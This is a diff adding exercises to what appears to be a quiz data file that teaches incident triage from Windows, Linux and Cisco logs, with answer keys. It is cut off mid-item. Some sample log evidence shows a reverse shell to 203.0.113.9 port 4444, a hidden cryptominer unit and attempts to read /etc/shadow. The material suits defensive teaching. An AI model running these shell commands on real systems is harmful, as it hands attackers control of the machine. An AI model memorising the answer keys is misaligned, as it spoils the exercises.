+  why: 'Pre-authentication proves the password with an encrypted timestamp before the DC replies: type 2, as for pua and leilani. Type 0 means svc_print skips it, so anyone can ask for its reply and crack the password offline.',
+  cmd: ["Get-WinEvent -FilterHashtable @{LogName='Security'; Id=4768}", "Get-WinEvent -FilterHashtable @{LogName='Security'; Id=4769}", "Get-WinEvent -FilterHashtable @{LogName='Security'; Id=4771}", "Get-WinEvent -FilterHashtable @{LogName='Security'; Id=4776}"],
+  q2: 'Step 2 of 2: which command surfaces it on PHN-DC-01?',
+  cwhy: "Sign-in tickets, each with its Pre-Authentication Type, are 4768 in the DC's Security log.",
+  cwhys: ['4769 records service tickets, issued after sign-in.', '4771 records failed pre-authentication, and this account skipped the step entirely.', '4776 records NTLM password checks, outside Kerberos.'],
+  fix: 'Turn pre-authentication back on, and give svc_print a long random password or a gMSA:\nSet-ADAccountControl -Identity svc_print -DoesNotRequirePreAuth $false\nThen check PHN-LAB-12 for the tool that asked.' },
+{ id: 'lg-sshwin', cat: 'Linux logs', title: 'Did the guessing work?',
+  sym: 'The overnight alert on phn-web01 counted 400 failed SSH passwords from one address. Did any of them get in?',
+  ev: [['phn-web01 /var/log/auth.log (Ubuntu Server 24.04, trimmed)', `2026-11-23T02:14:03.512345-10:00 phn-web01 sshd[2211]: Failed password for invalid user admin from 203.0.113.50 port 51122 ssh2
+2026-11-23T02:14:05.118220-10:00 phn-web01 sshd[2213]: Failed password for invalid user test from 203.0.113.50 port 51126 ssh2
+2026-11-23T02:17:01.004871-10:00 phn-web01 CRON[2290]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+2026-11-23T02:31:52.660107-10:00 phn-web01 sshd[2380]: Failed password for leilani from 203.0.113.50 port 52210 ssh2
+2026-11-23T02:31:58.901233-10:00 phn-web01 sshd[2380]: Accepted password for leilani from 203.0.113.50 port 52210 ssh2
+2026-11-23T02:31:58.905561-10:00 phn-web01 sshd[2380]: pam_unix(sshd:session): session opened for user leilani(uid=1001) by (uid=0)
+2026-11-23T07:45:10.230998-10:00 phn-web01 sshd[3120]: Accepted publickey for bkup from 10.1.20.30 port 40112 ssh2: ED25519 SHA256:Xq3vR0mT5cL8aZp1yQe2Nw6sJk4uHf9dBgVxC7oWiE0`]],
+  opts: ['The guessing worked: 203.0.113.50 signed in as leilani at 2:31 AM', 'Every try failed, so the alert can close', "bkup's 7:45 AM sign-in is the intruder", 'The 2:17 AM cron session let the attacker in'],
+  whys: ['An Accepted password line for leilani from 203.0.113.50 follows the failures.',
+    'bkup signed in with its key from 10.1.20.30, an inside Teachers address, at a normal hour.',
+    'That line is cron starting its hourly root job on the server itself; cron lines name an account, while sign-ins name an address.'],
+  why: 'Failures make an alert. The Accepted password for leilani from 203.0.113.50, the address that guessed all night, proves the guessing paid off: an incident. invalid user marks names absent from this server.',
+  cmd: ["sudo grep 'Accepted password' /var/log/auth.log", "sudo grep 'Failed password' /var/log/auth.log", "sudo grep -c 'Accepted password' /var/log/auth.log", 'sudo tail -n 50 /var/log/ufw.log'],
+  cwhy: 'It lists every password sign-in that worked; check each address against the guessing one.',
+  cwhys: ['It lists the failures, the alert you already have, and skips the one success.', '-c prints a count, without the account or the address.', 'ufw.log records firewall blocks; SSH sign-ins go to auth.log.'],
+  fix: "Lock leilani's account and end the session, then work it as an incident:\nsudo usermod -L leilani; sudo pkill -KILL -u leilani\nSet SSH to keys only (PasswordAuthentication no), test with sudo sshd -t, and reload ssh. leilani sets a new password in person before the unlock." },
+{ id: 'lg-useradd', cat: 'Linux logs', title: 'A second sudo user',
+  sym: "The baseline for phn-web01 lists one sudo user, bkup. Monday's check lists two.",
+  ev: [['phn-web01 /var/log/auth.log (trimmed)', `2026-11-20T23:02:11.104512-10:00 phn-web01 sshd[4410]: Accepted password for bkup from 10.1.10.37 port 50644 ssh2
+2026-11-20T23:03:40.771020-10:00 phn-web01 sudo:     bkup : TTY=pts/0 ; PWD=/home/bkup ; USER=root ; COMMAND=/usr/sbin/useradd -m -s /bin/bash svc_update
+2026-11-20T23:03:40.790311-10:00 phn-web01 useradd[4471]: new group: name=svc_update, GID=1004
+2026-11-20T23:03:40.790822-10:00 phn-web01 useradd[4471]: new user: name=svc_update, UID=1004, GID=1004, home=/home/svc_update, shell=/bin/bash, from=/dev/pts/0
+2026-11-20T23:04:02.318450-10:00 phn-web01 usermod[4480]: add 'svc_update' to group 'sudo'
+2026-11-20T23:04:02.318901-10:00 phn-web01 usermod[4480]: add 'svc_update' to shadow group 'sudo'
+2026-11-21T00:00:01.120334-10:00 phn-web01 CRON[4502]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)`]],
+  opts: ["bkup's account, signed in from a Students lab PC at 11 PM, created svc_update and gave it sudo", 'A package install created a system account', "bkup reset svc_update's password", 'svc_update signed in over SSH'],
+  whys: ['Packages make system accounts with low UIDs, such as 998, and a nologin shell. svc_update has UID 1004, bash, and sudo.',
+    'new user means svc_update first appeared at 11:03 PM.',
+    "The one SSH sign-in here is bkup's, from 10.1.10.37."],
+  why: 'useradd writes new group and new user lines, and usermod writes one line per group it adds. In order: bkup signs in by password from 10.1.10.37, a Students address, at 11:02 PM; its sudo runs useradd; svc_update joins sudo. An unapproved admin account is a classic way to stay in.',
+  cmd: ["sudo grep -E 'useradd|usermod' /var/log/auth.log", "sudo grep -c 'useradd' /var/log/auth.log", "sudo grep 'Failed password' /var/log/auth.log", 'sudo journalctl -u ssh -f'],
+  cwhy: '-E allows the |, so one pass lists the new account and its group changes.',
+  cwhys: ['-c prints a count, without the names.', 'These sign-ins succeeded, and account changes log as useradd and usermod.', 'It follows new SSH lines from now on, and account changes come from useradd and usermod.'],
+  fix: "Lock svc_update, end its processes, and take it out of sudo:\nsudo usermod -L -e 1 svc_update; sudo pkill -KILL -u svc_update\nsudo gpasswd -d svc_update sudo\nThen change bkup's password, move it to keys only, and find who used 10.1.10.37 at 11 PM." },
+{ id: 'lg-rootguess', cat: 'Linux logs', title: 'Where did auth.log go?',
+  sym: 'phn-sis01, our Debian 13 server, lacks /var/log/auth.log. Where are its SSH sign-ins, and what do they show?',
+  ev: [['phn-sis01 journal (Debian 13, trimmed)', `Nov 23 09:14:03 phn-sis01 sshd-session[1822]: Failed password for root from 198.51.100.23 port 40218 ssh2
+Nov 23 09:14:05 phn-sis01 sshd-session[1822]: Failed password for root from 198.51.100.23 port 40218 ssh2
+Nov 23 09:14:08 phn-sis01 sshd-session[1822]: Failed password for root from 198.51.100.23 port 40218 ssh2
+Nov 23 09:14:09 phn-sis01 sshd-session[1830]: Failed password for root from 198.51.100.23 port 40222 ssh2
+Nov 23 09:14:11 phn-sis01 sshd-session[1830]: Failed password for root from 198.51.100.23 port 40222 ssh2
+Nov 23 09:20:31 phn-sis01 sshd-session[1901]: Accepted publickey for bkup from 10.1.20.30 port 51544 ssh2: ED25519 SHA256:Xq3vR0mT5cL8aZp1yQe2Nw6sJk4uHf9dBgVxC7oWiE0`]],
+  opts: ["An outside address keeps guessing root's SSH password, and every try fails", 'The guessing worked: root signed in', "bkup's key was stolen", 'The SSH service crashed'],
+  whys: ["Every root line reads Failed password; the one Accepted line is bkup's key from 10.1.20.30, an inside Teachers address.",
+    'bkup signed in with its key from an inside address, and every line from 198.51.100.23 failed.',
+    'sshd-session answers and logs each try, and bkup signs in at 9:20.'],
+  why: "Debian 12 and later keep sign-ins in the systemd journal, so auth.log is absent by design. Every try from 198.51.100.23 targets root and fails: sshd's default, prohibit-password, already refuses root's password. PermitRootLogin no also refuses root keys, and an edge rule that keeps outside addresses off port 22 stops the guessing itself.",
+  cmd: ['sudo journalctl -u ssh', "sudo grep 'Failed password' /var/log/auth.log", 'sudo journalctl -k', 'sudo tail -n 50 /var/log/ufw.log'],
+  cwhy: 'Debian 13 keeps SSH sign-ins in the journal, and -u ssh picks that unit; the lines show sshd-session.',
+  cwhys: ['Debian 13 installs without rsyslog, so auth.log is missing.', '-k shows kernel messages, such as firewall blocks; sign-ins come from the ssh unit.', 'On Debian, firewall blocks go to the kernel journal, and SSH sign-ins sit in the ssh unit.'],
+  fix: 'Refuse root keys as well as passwords, then test and reload:\nPermitRootLogin no (in /etc/ssh/sshd_config)\nsudo sshd -t && sudo systemctl reload ssh\nsudo sshd -T | grep permitrootlogin (expect no; a file in sshd_config.d can override the main file)\nThen close port 22 to outside addresses at the edge firewall, so the guessing stops reaching the server.' },
+{ id: 'lg-scan', cat: 'Linux logs', title: 'A lab PC knocks on every door',
+  sym: "phn-web01's firewall log shows a burst of blocks during third period, almost all of them from one lab PC.",
+  ev: [['phn-web01 /var/log/ufw.log (trimmed; 10.1.10.37 is PHN-LAB-07)', `2026-11-23T10:02:14.118201-10:00 phn-web01 kernel: [UFW BLOCK] IN=enp0s3 OUT= SRC=10.1.10.37 DST=10.1.20.80 … PROTO=TCP SPT=50511 DPT=21 … SYN
+2026-11-23T10:02:14.118933-10:00 phn-web01 kernel: [UFW BLOCK] IN=enp0s3 OUT= SRC=10.1.10.37 DST=10.1.20.80 … PROTO=TCP SPT=50511 DPT=23 … SYN
+2026-11-23T10:02:14.119402-10:00 phn-web01 kernel: [UFW BLOCK] IN=enp0s3 OUT= SRC=10.1.10.37 DST=10.1.20.80 … PROTO=TCP SPT=50511 DPT=25 … SYN
+2026-11-23T10:02:14.120117-10:00 phn-web01 kernel: [UFW BLOCK] IN=enp0s3 OUT= SRC=10.1.10.37 DST=10.1.20.80 … PROTO=TCP SPT=50511 DPT=5900 … SYN
+2026-11-23T10:02:14.120690-10:00 phn-web01 kernel: [UFW BLOCK] IN=enp0s3 OUT= SRC=10.1.10.37 DST=10.1.20.80 … PROTO=TCP SPT=50511 DPT=3306 … SYN
+2026-11-23T10:02:14.121254-10:00 phn-web01 kernel: [UFW BLOCK] IN=enp0s3 OUT= SRC=10.1.10.37 DST=10.1.20.80 … PROTO=TCP SPT=50511 DPT=3389 … SYN
+2026-11-23T10:05:40.552103-10:00 phn-web01 kernel: [UFW BLOCK] IN=enp0s3 OUT= SRC=10.1.20.15 DST=10.1.20.80 … PROTO=TCP SPT=51812 DPT=8080 … SYN`]],
+  opts: ['PHN-LAB-07 (10.1.10.37) swept six ports in a few milliseconds, and ufw blocked each try: a port scan', 'An attacker got in through port 23', "phn-web01's web service failed", 'A Teachers PC at 10.1.20.15 runs the scan'],
+  whys: ['Each line reads UFW BLOCK: ufw dropped the try.',
+    'Each line is an inbound SYN to a port outside the allow list, and ports 80 and 443 stay out of it: the web service carries on.',
+    'One try to 8080 from a Teachers PC is a single stray connection; the scan hits six ports in milliseconds.'],
+  why: "One inside source, one target, and a new destination port every fraction of a millisecond (21, 23, 25, 5900, 3306, and 3389) is the shape of a port scan, and ufw dropped every try. Scanning the school network takes the owner's written permission, so this is a lead to follow up.",
+  cmd: ["sudo grep 'SRC=10.1.10.37' /var/log/ufw.log", "sudo grep 'SRC=10.1.10.37' /var/log/auth.log", 'sudo head -n 3 /var/log/ufw.log', "sudo grep -c 'UFW BLOCK' /var/log/ufw.log"],
+  cwhy: 'It keeps every block from that one source, so the sweep reads in order.',
+  cwhys: ['auth.log holds sign-ins and sudo; firewall blocks go to ufw.log.', 'head prints the three oldest lines, which shows the format and stops there.', '-c prints one count of every block, from every source.'],
+  fix: 'Find who used PHN-LAB-07 during third period and follow the acceptable-use policy. ufw already drops these ports; confirm the allow list stays short:\nsudo ufw status verbose' },
+{ id: 'lg-sudo', cat: 'Linux logs', title: 'A teacher account asks for root',
+  sym: 'leilani works only on phn-web01, yet the phn-sis01 journal shows her account there last night.',
+  ev: [['phn-sis01 journal (Debian 13, trimmed)', `Nov 22 22:41:07 phn-sis01 sshd-session[3301]: Accepted password for leilani from 10.1.10.37 port 50122 ssh2
+Nov 22 22:41:07 phn-sis01 sshd-session[3301]: pam_unix(sshd:session): session opened for user leilani(uid=1001) by (uid=0)
+Nov 22 22:42:15 phn-sis01 sudo[3340]:  leilani : user NOT in sudoers ; TTY=pts/0 ; PWD=/home/leilani ; USER=root ; COMMAND=/usr/bin/cat /etc/shadow
+Nov 22 22:42:31 phn-sis01 sudo[3344]:  leilani : user NOT in sudoers ; TTY=pts/0 ; PWD=/home/leilani ; USER=root ; COMMAND=/usr/bin/bash
+Nov 22 22:43:02 phn-sis01 sshd-session[3301]: pam_unix(sshd:session): session closed for user leilani
+Nov 23 06:25:01 phn-sis01 CRON[3410]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)`]],
+  opts: ['Someone signed in as leilani from a Students lab PC and tried twice to become root, and sudo refused both', 'leilani ran approved maintenance as root', 'root read /etc/shadow', 'The 6:25 AM cron session carried on the attack'],
+  whys: ['user NOT in sudoers means sudo refused: this account holds only standard rights here.',
+    'sudo refused before anything ran; COMMAND= records what was asked for.',
+    'That is cron starting the daily root job, on the server itself, at its stock time.'],
+  why: "sudo logs each command it is asked for (COMMAND=) and each refusal (user NOT in sudoers). leilani's account, signed in by password from 10.1.10.37, asked for the password hashes in /etc/shadow, then a root shell. She works elsewhere, so treat her password as known to someone else.",
+  cmd: ['sudo journalctl _COMM=sudo', 'sudo grep sudo /var/log/auth.log', 'sudo journalctl -u ssh --since today', 'sudo journalctl -k'],
+  cwhy: 'It keeps the journal lines sudo wrote, every request and refusal included.',
+  cwhys: ['Debian 13 installs without rsyslog, so auth.log is missing.', 'The ssh unit holds sign-ins while sudo writes its own lines, and --since today also skips last night.', '-k shows only kernel messages.'],
+  fix: 'Lock leilani and end the session, then have her set a new password in person:\nsudo usermod -L leilani; sudo pkill -KILL -u leilani\nTrace who used 10.1.10.37 at 10:41 PM, and limit SSH on phn-sis01 to the Teachers subnets:\nsudo ufw allow from 10.1.20.0/24 to any port 22 proto tcp' },
+{ id: 'lg-cron', cat: 'Linux logs', title: 'A call home every five minutes',
+  sym: 'The edge firewall logs phn-web01 connecting to 203.0.113.9 every five minutes, around the clock.',
+  ev: [['phn-web01 journal, cron unit (trimmed)', `Nov 23 03:00:01 phn-web01 CRON[5506]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Nov 23 03:00:01 phn-web01 CRON[5507]: (root) CMD (/bin/bash -c 'bash -i … /dev/tcp/203.0.113.9/4444 …')
+Nov 23 03:05:01 phn-web01 CRON[5531]: (root) CMD (/bin/bash -c 'bash -i … /dev/tcp/203.0.113.9/4444 …')
+Nov 23 03:09:01 phn-web01 CRON[5550]: (root) CMD (  [ -x /usr/lib/php/sessionclean ] && if [ ! -d /run/systemd/system ]; then /usr/lib/php/sessionclean; fi)
+Nov 23 03:10:01 phn-web01 CRON[5562]: (root) CMD (/bin/bash -c 'bash -i … /dev/tcp/203.0.113.9/4444 …')
+Nov 23 03:17:01 phn-web01 CRON[5590]: (root) CMD (cd / && run-parts --report /etc/cron.hourly)`]],
+  opts: ['A root cron job hands a shell to 203.0.113.9 every five minutes: a reverse shell backdoor', 'The hourly cron.hourly run', 'PHP clearing old sessions', 'A backup job copying files offsite'],
+  whys: ['The 3:17 line is the stock /etc/crontab entry for /etc/cron.hourly, once an hour, on the server itself.',
+    "sessionclean is the php package's own cleanup at :09 and :39, local to the server.",
+    'A backup runs a program that copies files. bash -i wired to /dev/tcp hands an interactive shell to whoever listens at 203.0.113.9 port 4444.'],
+  why: "cron logs every job as (user) CMD (command). bash -i pointed at /dev/tcp/203.0.113.9/4444 connects out and hands over an interactive root shell, on the same five-minute beat as the firewall's log. Something planted it in a root crontab or /etc/cron.d.",
+  cmd: ['sudo journalctl -u cron --since today', 'crontab -l', 'sudo journalctl -u ssh --since today', 'systemctl list-timers'],
+  cwhy: "cron's lines live in its own unit, and --since today narrows them to today.",
+  cwhys: ["It lists your own crontab, without root's or /etc/cron.d, and shows schedules in place of runs.", 'The ssh unit holds sign-ins, and cron runs jobs on its own.', 'Timers belong to systemd, the second scheduler; this job runs from cron.'],
+  fix: 'Find the line, keep a copy, and remove it:\nsudo crontab -l; ls -la /etc/cron.d\nsudo grep -r 203.0.113.9 /etc/cron* /var/spool/cron\nBlock 203.0.113.9 outbound, then hunt the same address in systemd units and .bashrc files.' },
+{ id: 'lg-unit', cat: 'Linux logs', title: 'A helper that eats a CPU core',
+  sym: "Since last night's reboot, phn-sis01 runs a process called dbus-helper that keeps one CPU core at 100%.",
+  ev: [['phn-sis01 journal since boot (Debian 13, trimmed)', `Nov 23 01:58:12 phn-sis01 systemd[1]: Started ssh.service - OpenBSD Secure Shell server.
+Nov 23 01:58:12 phn-sis01 systemd[1]: Started cron.service - Regular background program processing daemon.
+Nov 23 01:58:13 phn-sis01 systemd[1]: Started dbus-helper.service - D-Bus Helper.
+Nov 23 01:58:13 phn-sis01 dbus-helper[612]: connecting to 203.0.113.70:3333, threads: 4
+Nov 23 01:58:14 phn-sis01 dbus-helper[612]: job accepted (1/1)`],
+    ['phn-sis01: systemctl cat dbus-helper', `# /etc/systemd/system/dbus-helper.service
+[Unit]
+Description=D-Bus Helper
+
+[Service]
+ExecStart=/var/tmp/.cache/dbus-helper
+Restart=always
+
+[Install]
+WantedBy=multi-user.target`]],
+  opts: ['A unit added to /etc/systemd/system starts a hidden program from /var/tmp at every boot: persistence', 'A stock D-Bus component', 'A cron job started it', 'A kernel fault slowed the CPU'],
+  whys: ['D-Bus runs as dbus.service from /usr/bin. This unit sits in /etc/systemd/system and runs a hidden file from /var/tmp, a folder anyone can write.',
+    'systemd[1] started it at boot through dbus-helper.service, and Restart=always brings it back.',
+    'The CPU goes to a process that reports an outside address and four threads: work it was told to do.'],
+  why: "Units in /etc/systemd/system are local additions, and WantedBy=multi-user.target starts this one at every boot. Its program hides in /var/tmp/.cache under a borrowed name and connects to 203.0.113.70 with four threads: someone else's job, running on the school's CPU.",
+  cmd: ['sudo journalctl -u dbus-helper -b', 'sudo journalctl -p err -b', 'crontab -l', 'sudo journalctl -u ssh -b'],
+  cwhy: 'It keeps every line from that unit and its program since this boot.',
+  cwhys: ['-p err shows only errors, and the start and the program lines are routine priority.', 'cron is a separate scheduler, and systemd started this one.', 'The ssh unit holds only sign-ins.'],
+  fix: "Stop and disable it, keep a hash, and remove the unit:\nsudo systemctl disable --now dbus-helper\nsha256sum /var/tmp/.cache/dbus-helper\nsudo rm /etc/systemd/system/dbus-helper.service; sudo systemctl daemon-reload\nThen find how it arrived: the ssh unit and journalctl _COMM=sudo around the file's time (stat /var/tmp/.cache/dbus-helper)." },
+{ id: 'lg-apparmor', cat: 'Linux logs', title: 'The attendance app hits a wall at 3 AM',
+  sym: 'The attendance app on phn-web01 logged errors at 3:12 AM, hours before the first bell.',
+  ev: [['phn-web01 kernel log, AppArmor lines (trimmed)', `Nov 23 03:12:40 phn-web01 kernel: audit: type=1400 audit(1795439560.512:214): apparmor="DENIED" operation="exec" class="file" profile="/usr/local/bin/phn-attendance" name="/usr/bin/curl" pid=3118 comm="phn-attendance" requested_mask="x" denied_mask="x" fsuid=998 ouid=0
+Nov 23 03:12:40 phn-web01 kernel: audit: type=1400 audit(1795439560.530:215): apparmor="DENIED" operation="mknod" class="file" profile="/usr/local/bin/phn-attendance" name="/dev/shm/.k" pid=3118 comm="phn-attendance" requested_mask="c" denied_mask="c" fsuid=998 ouid=998
+Nov 23 06:00:02 phn-web01 kernel: audit: type=1400 audit(1795449602.101:216): apparmor="STATUS" operation="profile_replace" info="same as current profile, skipping" profile="unconfined" name="/usr/bin/man" pid=4410 comm="apparmor_parser"`]],
+  opts: ['Something made the attendance app try to run curl and drop a hidden file in /dev/shm, and its enforce-mode profile blocked both', 'The profile is in complain mode, so both actions ran', 'A routine profile reload by the package manager', "The profile is too tight for the app's normal work, so widen it"],
+  whys: ['Complain mode logs apparmor="ALLOWED". These lines read DENIED: enforce mode blocked them.',
+    'That is the 6:00 AM STATUS line, for man. The 3:12 AM lines are denials for the attendance app.',
+    'An attendance app records attendance; fetching files and writing hidden ones in /dev/shm at 3 AM sit outside that work. Accepting these denials as allow rules would open the hole for good.'],
+  why: 'DENIED means enforce mode stopped an action outside the profile. The app, running as its own account (fsuid 998), tried to launch curl and create a hidden file in /dev/shm: the pattern of an exploited web app. The wall held, and the flaw in the app remains.',
+  cmd: ['sudo journalctl -k | grep apparmor', 'sudo aa-status', 'sudo journalctl -u ssh', 'sudo grep apparmor /var/log/ufw.log'],
+  cwhy: 'AppArmor denials are kernel audit messages, and grep keeps just those.',
+  cwhys: ['aa-status lists profiles and their modes, without any denial.', 'The ssh unit holds only sign-ins.', 'ufw.log holds firewall blocks; AppArmor writes to the kernel log.'],
+  fix: 'Treat the app as exploited: keep the logs, take it offline, and patch it before it returns. Keep the profile in enforce mode, and refuse any aa-logprof rule for curl or /dev/shm.\nsudo aa-status (confirm phn-attendance sits under enforce mode)' },
+{ id: 'lg-auid', cat: 'Linux logs', title: 'Root opened the shell, but who was root?',
+  sym: 'Root on phn-sis01 opened a connection to 203.0.113.9 at 3:12 AM. Which person was behind it?',
+  ev: [['phn-sis01 audit records, key exec, interpreted (trimmed)', `----
+type=EXECVE msg=audit(11/23/2026 03:12:31.077:2209) : argc=2 a0=sudo a1=-i
+type=SYSCALL msg=audit(11/23/2026 03:12:31.077:2209) : arch=x86_64 syscall=execve success=yes exit=0 ppid=3090 pid=3101 auid=bkup uid=bkup gid=bkup euid=root tty=pts1 ses=7 comm=sudo exe=/usr/bin/sudo key=exec
+----
+type=PROCTITLE msg=audit(11/23/2026 03:12:40.512:2214) : proctitle=bash -c bash -i … /dev/tcp/203.0.113.9/4444 …
+type=EXECVE msg=audit(11/23/2026 03:12:40.512:2214) : argc=3 a0=bash a1=-c a2=bash -i … /dev/tcp/203.0.113.9/4444 …
+type=SYSCALL msg=audit(11/23/2026 03:12:40.512:2214) : arch=x86_64 syscall=execve success=yes exit=0 ppid=3108 pid=3121 auid=bkup uid=root gid=root euid=root tty=pts1 ses=7 comm=bash exe=/usr/bin/bash key=exec`]],
+  opts: ["bkup's own sign-in session ran sudo -i, then a reverse shell as root", "root's cron job ran it", 'A service ran it under its own account', 'uid=root hides the person, so any account could have done it'],
+  whys: ["A cron job carries its owner's ID, auid=root for root's jobs, and runs without a terminal. These carry auid=bkup on pts1.",
+    'A service carries auid unset. These come from session 7 on pts1, a signed-in terminal.',
+    'uid changes with sudo, and the audit user ID stays put, so auid names the person even as root.'],
+  why: "auditd stamps each record with the audit user ID set at sign-in, and sudo keeps it. Session 7 on pts1 ran sudo -i as bkup, then bash wired to /dev/tcp/203.0.113.9/4444 as root: bkup's sign-in opened the shell, whoever held its password.",
+  cmd: ['sudo ausearch -k exec -i', 'sudo ausearch -k mac -i', 'sudo aureport -x --summary', 'sudo auditctl -s'],
+  cwhy: '-k exec pulls the records the execve rule tagged, and -i turns IDs into names and times.',
+  cwhys: ['The mac key tags changes under /etc/apparmor.d, without the programs run.', 'It counts runs per program, without who ran each one.', 'It shows the audit status, such as enabled 2, without any record.'],
+  fix: 'Lock bkup and end its sessions, block 203.0.113.9 outbound, and treat phn-sis01 as compromised:\nsudo usermod -L bkup; sudo pkill -KILL -u bkup\nThen read the ssh unit around 3:12 AM for where session 7 signed in from.' },
+{ id: 'lg-config', cat: 'Cisco logs', title: 'Teachers ports moved overnight',
+  sym: 'This morning every Teachers port on SwA sits in VLAN 999, PARKING. The change log lists one approved switch change, on Friday.',
+  ev: [['SwA buffered log (clock in UTC, trimmed)', `000131: Nov 20 22:30:15.882: %SYS-5-CONFIG_I: Configured from console by netadmin on console
+000136: Nov 23 07:02:51.430: %LINK-3-UPDOWN: Interface FastEthernet0/14, changed state to down
+000138: Nov 23 12:13:41.090: %SSH-5-SSH2_USERAUTH: User 'netadmin' authentication for SSH2 Session from 10.1.20.66 (tty = 0) using crypto cipher 'aes256-ctr', hmac 'hmac-sha2-256' Succeeded
+000139: Nov 23 12:14:07.311: %SYS-5-CONFIG_I: Configured from console by netadmin on vty0 (10.1.20.66)`]],
+  opts: ["netadmin's account signed in over SSH from 10.1.20.66 at 2:14 AM HST and changed the config", "Friday's approved change from the console", 'A reload brought back an old config', 'Port Fa0/14 failed and took the Teachers ports with it'],
+  whys: ["Friday's change came from the console at 12:30 PM HST (22:30 UTC), and the ports moved after the 2:14 AM change from vty0.",
+    'A reload logs a restart and starts the sequence numbers over. These keep counting, and CONFIG_I names a person and an address.',
+    'Fa0/14, a Teachers port at the time, went down at 9 PM HST, before the change, and a link change leaves other ports in their VLANs.'],
+  why: "%SYS-5-CONFIG_I records every exit from configuration mode, with the user, the line, and the address. The clock runs in UTC, so 12:14 is 2:14 AM HST: netadmin's password was used from 10.1.20.66 while staff were home, and the change log lists zero approvals for it.",
+  cmd: ['show logging', 'show running-config', 'show ip interface brief', 'show vlan brief'],
+  q2: 'Step 2 of 2: which command surfaces these lines on SwA?',
+  cwhy: 'It shows the logging settings, then the messages held in the buffer.',
+  cwhys: ['It shows the config as it stands now, without who changed it or when.', 'It shows interface states this second, without any history.', 'It shows the ports in PARKING now, without the change that put them there.'],
+  fix: "Put the Teachers ports back from the addressing plan and save, then change netadmin's password and find who used 10.1.20.66 at 2:14 AM HST.\nshow startup-config (compare it with the running-config)\ncopy running-config startup-config (once the ports are right)\nlogging host 10.1.20.50 keeps a copy of every line off the switch." },
+{ id: 'lg-clock', cat: 'Cisco logs', title: 'A scan from last March?',
+  sym: "The incident timeline needs RtrA's ACL hits for this morning's scan, and RtrA's log dates them March 1.",
+  ev: [['RtrA buffered log (trimmed)', `000052: *Mar  1 00:41:17.311: %SEC-6-IPACCESSLOGP: list EDGE-IN denied tcp 203.0.113.80(51544) -> 203.0.113.2(23), 1 packet
+000053: *Mar  1 00:41:19.020: %SEC-6-IPACCESSLOGP: list EDGE-IN denied tcp 203.0.113.80(51560) -> 203.0.113.2(3389), 1 packet
+000054: *Mar  1 00:46:17.312: %SEC-6-IPACCESSLOGP: list EDGE-IN denied tcp 203.0.113.80(51544) -> 203.0.113.2(23), 4 packets`]],
+  opts: ["RtrA's clock runs unsynced: the leading * marks it, and the clock counts from its boot default", 'The scan happened on March 1', 'The ACL logs the wrong packets', 'A full log buffer changed the times'],
+  whys: ['An unset IOS clock starts at March 1 after each reload, and the * flags it. The true time stays unknown until NTP syncs.',
+    'The lines name EDGE-IN, the outside address, and the ports correctly; only the time is off.',
+    'A full buffer drops its oldest lines and leaves timestamps alone.'],
+  why: "A leading * on an IOS timestamp marks an unsynced clock, and an unset clock starts at March 1 after a reload. Every time in this log is untrustworthy until NTP syncs it, so these hits join a timeline only by matching other devices' logs.",
+  cmd: ['show ntp associations', 'timedatectl', 'w32tm /query /status', 'show ip interface brief'],
+  q2: 'Step 2 of 2: which command confirms it on RtrA?',
+  cwhy: 'It lists the NTP servers and marks the one in use with an *; an unmarked list means the clock runs unsynced.',
+  cwhys: ['timedatectl checks sync on a Linux server.', 'w32tm checks sync on Windows.', 'It shows interface states, without the clock.'],
+  fix: "Sync RtrA to the school's time server, then confirm:\nntp server 10.1.20.50\nshow ntp associations (expect * beside 10.1.20.50)\nThe old lines keep their wrong times: date them by matching the firewall and server logs." },
+{ id: 'lg-flap', cat: 'Cisco logs', title: 'Site B drops every 20 seconds',
+  sym: 'Since the ceiling work on Saturday, Site B Teachers PCs lose the network for a few seconds, over and over.',
+  ev: [['SwB buffered log (clock in UTC, trimmed)', `000311: Nov 23 18:02:11.402: %LINK-3-UPDOWN: Interface GigabitEthernet0/1, changed state to down
+000312: Nov 23 18:02:12.405: %LINEPROTO-5-UPDOWN: Line protocol on Interface GigabitEthernet0/1, changed state to down
+000313: Nov 23 18:02:14.877: %LINK-3-UPDOWN: Interface GigabitEthernet0/1, changed state to up
+000314: Nov 23 18:02:15.880: %LINEPROTO-5-UPDOWN: Line protocol on Interface GigabitEthernet0/1, changed state to up
+000315: Nov 23 18:02:31.090: %LINK-3-UPDOWN: Interface GigabitEthernet0/1, changed state to down
+000316: Nov 23 18:02:32.093: %LINEPROTO-5-UPDOWN: Line protocol on Interface GigabitEthernet0/1, changed state to down
+000317: Nov 23 18:02:34.551: %LINK-3-UPDOWN: Interface GigabitEthernet0/1, changed state to up
+000318: Nov 23 18:02:35.554: %LINEPROTO-5-UPDOWN: Line protocol on Interface GigabitEthernet0/1, changed state to up
+000319: Nov 23 18:03:02.017: %SYS-5-CONFIG_I: Configured from console by netadmin on vty0 (10.2.20.20)`]],
+  opts: ['The uplink G0/1 keeps losing its signal for a few seconds: a Layer 1 fault from the ceiling work', "netadmin's 18:03 change broke the uplink", 'Someone keeps typing shutdown on G0/1', 'A DHCP outage at Site B'],
+  whys: ['The flaps run before that change, and a config change logs CONFIG_I, while these links drop on their own.',
+    'A shutdown logs changed state to administratively down. These lines read down, then up a few seconds later, all on their own.',
+    'DHCP trouble keeps the link up and leaves PCs on 169.254 addresses. Here the link itself drops.'],
+  why: '%LINK-3-UPDOWN (severity 3, an error) tracks the physical link, and LINEPROTO follows a second later. Down and up every 20 seconds, with the config untouched in between, points at Layer 1: a cable or connector disturbed above the ceiling.',
+  cmd: ['show logging | include UPDOWN', 'show running-config | include UPDOWN', 'show logging | include CONFIG_I', 'show interfaces trunk'],
+  cwhy: '| include keeps the lines holding that text: every link and line protocol change.',
+  cwhys: ['The running-config holds settings, without log messages.', 'It keeps the config changes and drops the link lines.', 'It shows the trunk as it stands this second, without its history.'],
+  fix: 'Check the uplink cable run and both connectors where the ceiling work happened, and swap in a known-good cable.\nshow interfaces g0/1 (watch the input errors and CRC counters)\nshow logging | include UPDOWN (expect it to stay quiet)' },
+{ id: 'lg-aclscan', cat: 'Cisco logs', title: 'The edge router logs all night',
+  sym: "RtrA's log filled up overnight. Did anything get through?",
+  ev: [['RtrA buffered log (clock in UTC, trimmed)', `000412: Nov 23 13:02:11.118: %SEC-6-IPACCESSLOGP: list EDGE-IN denied tcp 198.51.100.77(40001) -> 203.0.113.2(22), 1 packet
